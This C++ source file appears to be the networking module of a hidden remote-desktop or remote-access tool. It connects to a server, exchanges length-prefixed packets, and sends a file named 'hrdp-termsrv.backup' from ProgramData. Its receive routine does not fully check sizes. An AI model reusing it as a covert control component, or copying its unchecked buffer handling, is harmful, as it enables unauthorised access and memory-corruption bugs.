#include"net.h"
#include<mutex>
#include <WS2tcpip.h>
#define PACKHEADERSLEN 5
std::mutex m;
namespace net {
	SOCKET s;
	BOOL init() {
		WSAData d;
		if (WSAStartup(MAKEWORD(2, 0), &d)) { return FALSE; }
		return TRUE;
	}

	BOOL sendDll() {
		FILE* fp;
		BOOL ret = FALSE;
		_wfopen_s(&fp, L"C:\\ProgramData\\hrdp-termsrv.backup", L"rb");
		if (!fp) { return FALSE; }
		fseek(fp, 0, SEEK_END);
		int sz = ftell(fp);
		rewind(fp);
		char* p = (char*)malloc(sz);
		if (!p) { return FALSE; }
		fread(p, 1, sz, fp);
		fclose(fp);
		//Send
		if (!net::pktSend(net::s, p, sz, 0x02)) { ret = TRUE; }
		free(p);
		return ret;


	}
	int pktSend(SOCKET s, char* buff, int sz, char type) {
		if (send(s, (char*)&type, 1, 0)<=0) { return -1; }
		if (send(s, (char*)&sz, 4, 0)<=0) { return -1; }
		if (sz == 0 && buff == nullptr) { return 0; }
		if (send(s, buff, sz, 0)<=0) { return -1; }

		return 0;
	}
	int recvit(SOCKET s, char* buffer, int count) {

		int tot = 0, rest, r;
		rest = count;
		while (tot < count) {
			r = recv(s, &buffer[tot], rest, 0);
			if (r == SOCKET_ERROR || r==0) { return -1; }
			tot += r;
			rest = count - tot;


		}


		return 0;
	}
	BOOL recvp(char* buffer, int maxsz, _Out_ int *p_size) {
		*p_size = 0;
		int sz;
		if (recvit(s, buffer, 1) == SOCKET_ERROR) { return FALSE; }
		if (recvit(s, (char*)&sz, 4) == SOCKET_ERROR) { return FALSE; }
		if (sz > maxsz) {  return FALSE; }
		if (recvit(s, &buffer[1], sz) == SOCKET_ERROR) { return FALSE; }

		*p_size = sz;
		return TRUE;
	}
	BOOL connect(char* srv, unsigned short port,SOCKET *s) {
		SOCKADDR_IN inf;
		memset(&inf, 0, sizeof(inf));
		inf.sin_family = AF_INET;
		inf.sin_port = htons(port);
		inet_pton(AF_INET, srv, &inf.sin_addr.s_addr);
		*s = socket(AF_INET, SOCK_STREAM, 0);
		if (connect(*s, (sockaddr*)&inf, sizeof(inf)) != SOCKET_ERROR) { return TRUE; }
		closesocket(*s);
		return FALSE;

	}
	int sendall(SOCKET s, char* buf, int len)
	{
		int total = 0;        // how many bytes we've sent
		int bytesleft = len; // how many we have left to send
		int n = 0;

		while (total < len) {
			n = send(s, buf + total, bytesleft, 0);
			if (n == -1) { break; }
			total += n;
			bytesleft -= n;
		}

		len = total; // return number actually sent here

		return n == -1 ? -1 : 0; // return -1 on failure, 0 on success
	}

}